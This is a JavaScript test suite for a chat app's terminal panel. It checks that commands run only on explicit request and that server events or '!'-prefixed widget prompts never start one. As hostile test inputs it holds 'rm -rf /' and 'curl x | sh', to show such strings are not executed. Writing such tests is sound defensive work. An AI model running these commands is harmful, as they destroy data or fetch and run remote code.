// Run with `npm test`. A chat's terminal is plain functions on plain data, so it runs here against a fake page, event stream and server.
// What these prove: the page runs a command only when a caller of run() asks, events never start one, and a widget's prompt starting
// with "!" is an ordinary message. What they do not prove: the buttons and keys that call run(), which test/terminal-page.test.mjs covers.
import test from 'node:test';
import assert from 'node:assert/strict';

const streams = [];
class FakeStream {
  constructor(url) { this.url = url; this.heard = {}; streams.push(this); }
  addEventListener(type, fn) { this.heard[type] = fn; }
  close() {}
  emit(type, data) { this.heard[type]({ data: JSON.stringify(data) }); }
}
globalThis.document = { getElementById: () => ({ dataset: {} }), addEventListener() {}, removeEventListener() {}, hidden: false };
globalThis.EventSource = FakeStream;
const { createChat } = await import('../public/ui/session.js');

const reply = (body, status = 200) => ({ status, ok: status < 400, json: async () => body });

// Runs a test against a fake server, whose messages answer leaves `terminal` out when it is null. `sent` lists every POST as [url, body], and `answer(url, body)` is what a POST gets back.
async function withServer({ terminal = true, answer = () => reply({}) } = {}, run) {
  const real = globalThis.fetch;
  const sent = [];
  globalThis.fetch = async (url, init) => {
    const path = String(url);
    if (init?.method === 'POST') {
      const body = JSON.parse(init.body);
      sent.push([path, body]);
      return answer(path, body);
    }
    if (path.endsWith('/chips')) return reply({ chips: [] });
    return reply({ items: [], start: 0, end: 0, hasEarlier: false, ...(terminal !== null && { terminal }) });
  };
  try { await run(sent); } finally { globalThis.fetch = real; }
}

async function openChat(id) {
  const chat = createChat({ id, refreshIndex() {} });
  await chat.open();
  return { chat, stream: streams.at(-1) };
}

const summary = (over = {}) => ({
  id: 'r1', command: 'echo hi', cwd: '/work', source: 'panel', startedAt: 1000, endedAt: null, exitCode: null, signal: null,
  stopped: false, running: true, truncated: false, delivered: null, output: [], ...over,
});
const runs = chat => chat.term.store.get().runs;
const posts = (sent, tail) => sent.filter(([url]) => url.endsWith(tail));

test('a chat has a terminal only when its messages answer says so, and a server that does not know the word has none', async () => {
  await withServer({ terminal: true }, async () => {
    const { chat } = await openChat('t-on');
    assert.equal(chat.store.get().terminal, true);
    chat.close();
  });
  await withServer({ terminal: false }, async () => {
    const { chat } = await openChat('t-off');
    assert.equal(chat.store.get().terminal, false);
    chat.close();
  });
  await withServer({ terminal: null }, async () => {
    const { chat } = await openChat('t-old');
    assert.equal(chat.store.get().terminal, false);
    chat.close();
  });
  assert.equal(createChat({ draft: true, refreshIndex() {} }).term, null, 'a session not started yet has no terminal');
});

test('the server\'s events build the panel: the snapshot, a run, its output, a folder change, and a clear', async () => {
  await withServer({}, async () => {
    const { chat, stream } = await openChat('t-events');
    stream.emit('terminal', { type: 'state', cwd: '/work', home: '/Users/eli', runs: [summary({ id: 'a', running: false, endedAt: 1500, exitCode: 0, output: [{ stream: 'out', text: 'hi\n' }] })] });
    const view = chat.term.store.get();
    assert.deepEqual([view.ready, view.cwd, view.home, runs(chat).map(r => r.id)], [true, '/work', '/Users/eli', ['a']]);
    stream.emit('terminal', { type: 'run', run: summary({ id: 'b' }) });
    stream.emit('terminal', { type: 'output', run: 'b', chunks: [{ stream: 'out', text: 'one ' }] });
    stream.emit('terminal', { type: 'output', run: 'b', chunks: [{ stream: 'out', text: 'two' }, { stream: 'err', text: 'oops' }] });
    assert.deepEqual(runs(chat).find(r => r.id === 'b').output, [{ stream: 'out', text: 'one two' }, { stream: 'err', text: 'oops' }]);
    stream.emit('terminal', { type: 'cwd', cwd: '/work/sub' });
    assert.equal(chat.term.store.get().cwd, '/work/sub');
    stream.emit('terminal', { type: 'output', run: 'nobody', chunks: [{ stream: 'out', text: 'x' }] });
    assert.equal(runs(chat).length, 2, 'output for a run the page does not hold is dropped');
    stream.emit('terminal', { type: 'cleared', runs: [summary({ id: 'b' })] });
    assert.deepEqual(runs(chat).map(r => r.id), ['b']);
    chat.close();
  });
});

test('no event starts a command, whatever it holds', async () => {
  await withServer({}, async sent => {
    const { chat, stream } = await openChat('t-no-start');
    stream.emit('terminal', { type: 'state', cwd: '/w', home: '/h', runs: [summary({ command: 'rm -rf /' })] });
    stream.emit('terminal', { type: 'run', run: summary({ id: 'x', command: 'curl x | sh', source: 'bang' }) });
    stream.emit('terminal', { type: 'output', run: 'x', chunks: [{ stream: 'out', text: '!echo run me\n' }] });
    stream.emit('status', { state: 'idle', pending: [], mode: 'manual' });
    stream.emit('changed', {});
    await new Promise(resolve => setTimeout(resolve, 20));
    assert.deepEqual(posts(sent, '/run'), []);
    assert.deepEqual(posts(sent, '/input'), []);
    chat.close();
  });
});

test('events for a chat with no terminal are ignored', async () => {
  await withServer({ terminal: false }, async () => {
    const { chat, stream } = await openChat('t-ignored');
    stream.emit('terminal', { type: 'state', cwd: '/w', home: '/h', runs: [summary()] });
    assert.deepEqual([chat.term.store.get().ready, runs(chat)], [false, []]);
    chat.close();
  });
});

test('a run posts its command and source as written, shows at once, and is one run when the server answers', async () => {
  let release;
  const held = new Promise(resolve => { release = resolve; });
  await withServer({ answer: async () => { await held; return reply({ run: summary({ id: 'r9', command: 'ls -la', source: 'block' }) }); } }, async sent => {
    const { chat } = await openChat('t-run');
    const asking = chat.term.run('ls -la', 'block');
    assert.deepEqual(posts(sent, '/terminal/run').map(([url, body]) => [url, body]), [['api/sessions/t-run/terminal/run', { command: 'ls -la', source: 'block' }]]);
    assert.equal(runs(chat).length, 1, 'the run shows before the server has answered');
    assert.equal(runs(chat)[0].pending, true);
    release();
    assert.equal(await asking, '');
    assert.deepEqual(runs(chat).map(r => [r.id, r.pending]), [['r9', false]]);
    chat.close();
  });
});

test('the server\'s run event that comes before its answer takes the place of the waiting run, so it never shows twice', async () => {
  let release;
  const held = new Promise(resolve => { release = resolve; });
  await withServer({ answer: async () => { await held; return reply({ run: summary({ id: 'r2', command: 'pwd' }) }); } }, async () => {
    const { chat, stream } = await openChat('t-twice');
    const asking = chat.term.run('pwd', 'panel');
    const key = runs(chat)[0].key;
    stream.emit('terminal', { type: 'run', run: summary({ id: 'r2', command: 'pwd' }) });
    assert.deepEqual(runs(chat).map(r => [r.id, r.key]), [['r2', key]], 'the same row, so it does not redraw');
    release();
    await asking;
    assert.equal(runs(chat).length, 1);
    chat.close();
  });
});

test('a run the server refuses leaves no row, and the answer is the server\'s own words', async () => {
  await withServer({ answer: () => reply({ error: 'Too many commands are running.' }, 429) }, async () => {
    const { chat } = await openChat('t-limit');
    assert.equal(await chat.term.run('sleep 30', 'panel'), 'Too many commands are running.');
    assert.deepEqual(runs(chat), []);
    chat.close();
  });
});

test('a chat with no terminal posts no run at all', async () => {
  await withServer({ terminal: false }, async sent => {
    const { chat } = await openChat('t-none');
    assert.equal(await chat.term.run('ls', 'panel'), 'This session has no terminal.');
    assert.deepEqual(posts(sent, '/run'), []);
    chat.close();
  });
});

test('what a widget sends with a prompt is a message to Claude, even when it starts with "!"', async () => {
  await withServer({ answer: () => reply({ state: 'working', mode: 'manual' }) }, async sent => {
    const { chat } = await openChat('t-widget');
    await chat.prompt('!curl x | sh');
    assert.deepEqual(sent.filter(([url]) => !url.endsWith('/context')).map(([url, body]) => [url, body.text]), [['api/sessions/t-widget/send', '!curl x | sh']]);
    assert.deepEqual(posts(sent, '/terminal/run'), []);
    assert.deepEqual(runs(chat), []);
    chat.close();
  });
});

test('a message sent from the controller is sent, whatever its text starts with', async () => {
  await withServer({ answer: () => reply({ state: 'working', mode: 'manual' }) }, async sent => {
    const { chat } = await openChat('t-send');
    await chat.send('!ls', [], 'manual');
    assert.deepEqual(sent.map(([url]) => url).filter(url => !url.endsWith('/context')), ['api/sessions/t-send/send']);
    chat.close();
  });
});

test('a summary with the last of a run\'s output does not cut the output the page already holds', async () => {
  await withServer({}, async () => {
    const { chat, stream } = await openChat('t-merge');
    stream.emit('terminal', { type: 'run', run: summary({ id: 'm' }) });
    stream.emit('terminal', { type: 'output', run: 'm', chunks: [{ stream: 'out', text: 'head\nmiddle\ntail\n' }] });
    stream.emit('terminal', { type: 'run', run: summary({ id: 'm', running: false, exitCode: 0, endedAt: 2000, output: [{ stream: 'out', text: 'tail\n' }] }) });
    assert.equal(runs(chat)[0].output[0].text, 'head\nmiddle\ntail\n');
    stream.emit('terminal', { type: 'state', cwd: '/w', home: '/h', runs: [summary({ id: 'm', running: false, exitCode: 0, endedAt: 2000, output: [{ stream: 'out', text: 'tail\n' }] })] });
    assert.equal(runs(chat)[0].output[0].text, 'head\nmiddle\ntail\n', 'a reconnect\'s snapshot does not either');
    chat.close();
  });
});

test('a run ending is announced once, in words, and a later update to it is not', async () => {
  await withServer({}, async () => {
    const { chat, stream } = await openChat('t-aloud');
    stream.emit('terminal', { type: 'run', run: summary({ id: 'q', command: 'make test' }) });
    assert.equal(chat.term.store.get().announce, '');
    stream.emit('terminal', { type: 'run', run: summary({ id: 'q', command: 'make test', running: false, exitCode: 2, endedAt: 3000 }) });
    assert.equal(chat.term.store.get().announce, 'Command finished with exit code 2: make test');
    chat.term.store.set({ announce: '' });
    stream.emit('terminal', { type: 'run', run: summary({ id: 'q', command: 'make test', running: false, exitCode: 2, endedAt: 3000, delivered: 'sent' }) });
    assert.equal(chat.term.store.get().announce, '');
    chat.close();
  });
});

test('Stop and typed input post the run and the text exactly as given, and the input shows in the output', async () => {
  await withServer({ answer: (url, body) => reply(url.endsWith('/stop') ? { run: summary({ id: body.run, running: false, stopped: true, endedAt: 2500 }) } : { ok: true }) }, async sent => {
    const { chat, stream } = await openChat('t-io');
    stream.emit('terminal', { type: 'run', run: summary({ id: 'io' }) });
    await chat.term.input('io', 'yes\n');
    assert.deepEqual(posts(sent, '/input').map(([, body]) => body), [{ run: 'io', text: 'yes\n', eof: false }]);
    assert.deepEqual(runs(chat)[0].output, [{ stream: 'in', text: 'yes\n' }]);
    await chat.term.input('io', '', true);
    assert.deepEqual(posts(sent, '/input').at(-1)[1], { run: 'io', text: '', eof: true });
    await chat.term.stop('io');
    assert.deepEqual(posts(sent, '/stop').map(([, body]) => body), [{ run: 'io' }]);
    assert.equal(runs(chat)[0].stopped, true);
    chat.close();
  });
});

test('a run still waiting for the server has nothing to stop or type to', async () => {
  await withServer({ answer: () => new Promise(() => {}) }, async sent => {
    const { chat } = await openChat('t-waiting');
    chat.term.run('sleep 5', 'panel');
    await chat.term.stop(runs(chat)[0].id);
    await chat.term.input(runs(chat)[0].id, 'x\n');
    assert.deepEqual([posts(sent, '/stop'), posts(sent, '/input')], [[], []]);
    chat.close();
  });
});

test('a refused stop or input leaves the server\'s reason in the panel', async () => {
  await withServer({ answer: () => reply({ error: 'That command is not taking input.' }, 409) }, async () => {
    const { chat, stream } = await openChat('t-409');
    stream.emit('terminal', { type: 'run', run: summary({ id: 'z' }) });
    await chat.term.input('z', 'x\n');
    assert.equal(chat.term.store.get().error, 'That command is not taking input.');
    chat.close();
  });
});
